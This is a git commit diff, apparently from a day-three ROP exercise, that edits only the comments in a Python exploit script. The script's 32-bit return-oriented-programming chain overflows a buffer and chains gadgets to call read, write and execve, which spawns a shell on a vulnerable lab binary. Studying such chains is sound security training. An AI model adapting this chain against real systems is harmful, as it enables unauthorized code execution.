5c5da2afb69bd187457d7b3cc39d263c7de8828a
cpuu <cpuu@icloud.com>
2019-06-27 16:32:13 +0900

    pwnt.py edit typo

--- day3/rop/pwnt.py
+++ day3/rop/pwnt.py
@@ -13,7 +13,7 @@ exploit = "A"*7680
 ##############  read(0,0x0804a000, 8);
 
 exploit += p32(0x08048375)  # pop ebx; ret
-exploit += p32(0x0)         # ebx
+exploit += p32(0x0)         # ebx 0
 exploit += p32(0x08048552)  # pop eax; pop ecx; ret
 exploit += p32(0x3)         # eax system call : 0x03 : sys_read
 exploit += p32(0x0804a000)  # ecx 0x0804a000
@@ -24,7 +24,7 @@ exploit += p32(0x08048542)  # int 0x80; ret
 ##############  write(1,0x0804a000, 8);
 
 exploit += p32(0x08048375)  # pop ebx; ret
-exploit += p32(0x1)         # ebx
+exploit += p32(0x1)         # ebx 1
 exploit += p32(0x08048552)  # pop eax; pop ecx; ret
 exploit += p32(0x4)         # eax system call : 0x04 : sys_write
 exploit += p32(0x0804a000)  # ecx 0x0804a000
@@ -36,10 +36,10 @@ exploit += p32(0x08048542)  # int 0x80; ret
 ##############  execve(0x0804a000, 0, 0);
 
 exploit += p32(0x08048375)  # pop ebx; ret
-exploit += p32(0x0804a000)  # ebx
+exploit += p32(0x0804a000)  # ebx 0x0804a000
 exploit += p32(0x08048552)  # pop eax; pop ecx; ret
 exploit += p32(0xb)         # eax system call : 0x0b : sys_execve
-exploit += p32(0x0)         # ecx 0x0804a000
+exploit += p32(0x0)         # ecx 0
 exploit += p32(0x08048580)  # pop edx; ret
 exploit += p32(0x0)         # edx 0
 exploit += p32(0x08048542)  # int 0x80; ret
